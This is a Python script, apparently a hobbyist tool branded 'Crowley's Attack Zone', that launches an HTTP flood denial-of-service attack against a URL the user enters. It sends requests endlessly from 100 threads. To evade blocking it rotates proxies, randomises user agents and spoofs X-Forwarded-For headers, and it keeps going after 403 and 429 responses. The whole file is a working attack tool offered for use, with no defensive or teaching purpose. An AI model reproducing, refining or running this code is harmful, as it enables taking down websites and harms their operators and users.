import requests
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle
import threading

# ------------------- CONFIGURATION -------------------
TARGET_URL = input("🔗 Enter the target URL: ")
MAX_THREADS = 100  # Maximum threads limit

# Random simulated proxies (use your real proxies if you have them)
fake_proxies = [f"http://proxy{n}.example.com" for n in range(1, 101)]
proxy_pool = cycle(fake_proxies)

# ------------------- RANDOM FUNCTIONS -------------------
def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100.0",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/97.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; ASL) like Gecko",
        "Mozilla/5.0 (Windows NT 6.2; rv:34.0) Gecko/20100101 Firefox/34.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/58.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; ASL) like Gecko",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; ASL) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ASL) like Gecko",
        "Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A705MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def random_headers():
    return {
        "User-Agent": random_user_agent(),
        "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
        "Referer": random.choice([
            "https://google.com", "https://duckduckgo.com", "https://bing.com"
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9"
        ])
    }

# ------------------- ATTACK -------------------
def send_attack(bot_id):
    headers = random_headers()
    proxy = next(proxy_pool)

    try:
        response = requests.get(
            TARGET_URL,
            headers=headers,
            proxies={"http": proxy, "https": proxy},
            timeout=5
        )

        if response.status_code in [403, 429]:
            print(f"❌ Bot {bot_id} blocked. Retrying...")
            time.sleep(5)

        print(f"✅ Bot {bot_id} | Status: {response.status_code} | Attack performed successfully on {TARGET_URL}")

    except Exception as e:
        print(f"⚠️ Bot {bot_id} failed: {str(e)}")

# ------------------- CONTROL FUNCTIONS -------------------
def attack_loop(stop_event):
    print(f"\n🚀 Starting infinite attack with {MAX_THREADS} threads...\n")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        bot_id = 1
        while not stop_event.is_set():
            executor.submit(send_attack, bot_id)
            bot_id += 1  # This makes bot_id infinite

def status_check():
    print("⏳ Checking web status for 10s...")
    for i in range(10, 0, -1):
        print(f"⏱️ {i}...")
        time.sleep(1)

    try:
        r = requests.get(TARGET_URL, timeout=5)
        print(f"✅ Status: {r.status_code} | Ready for attack.")
    except:
        print("❌ Could not verify status. Possible downtime or block.")

    print("⌛ Confirming attack in 3s...")
    time.sleep(3)

# ------------------- BANNER AND EXECUTION -------------------
def banner():
    print("""
███████████████████████████████████████████
💥 Crowley’s Attack Zone 🧨
──────────────────────────────────────────────
(1) ⚡ Initiate DoS (URL)
(2) ⏹️ Exit
──────────────────────────────────────────────
📲 TikTok: croowleyy | IG: croowleey
🔑 "The network will fall... in seconds."
███████████████████████████████████████████
""")
    print("🔥 Welcome to the Crowley attack! 🔥")

# Global variable to stop the attack
stop_event = threading.Event()

def stop_attack():
    input("\nPress Enter to stop the attack...")  # Wait for input to stop the attack
    stop_event.set()  # This stops the attack

def main():
    banner()
    status_check()
    # Create a thread to stop the attack
    stop_thread = threading.Thread(target=stop_attack)
    stop_thread.daemon = True
    stop_thread.start()

    attack_loop(stop_event)

if __name__ == "__main__":
    main()
